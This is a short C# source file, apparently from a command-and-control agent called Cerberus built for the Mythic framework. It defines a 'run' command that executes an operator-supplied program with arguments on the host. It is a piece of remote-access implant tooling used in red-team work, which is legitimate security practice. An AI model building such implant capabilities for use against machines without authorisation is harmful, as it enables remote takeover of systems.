using Cerberus.Models.Tasks;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Cerberus.Commands
{
    public class Run : CerberusCommand
    {
        public override string Name => "run";

        public override string Execute(MythicTask task)
        {
            var Arguments = task.parameters.Split(' ');

            if (Arguments is null || Arguments.Length == 0)
                return "No arguments supplied. Must supply file to execute and any required arguments";

            var fileName = Arguments[0];
            var args = string.Join(" ", Arguments.Skip(1));

            return Internal.Execute.ExecuteCommand(fileName, args);
        }
    }
}
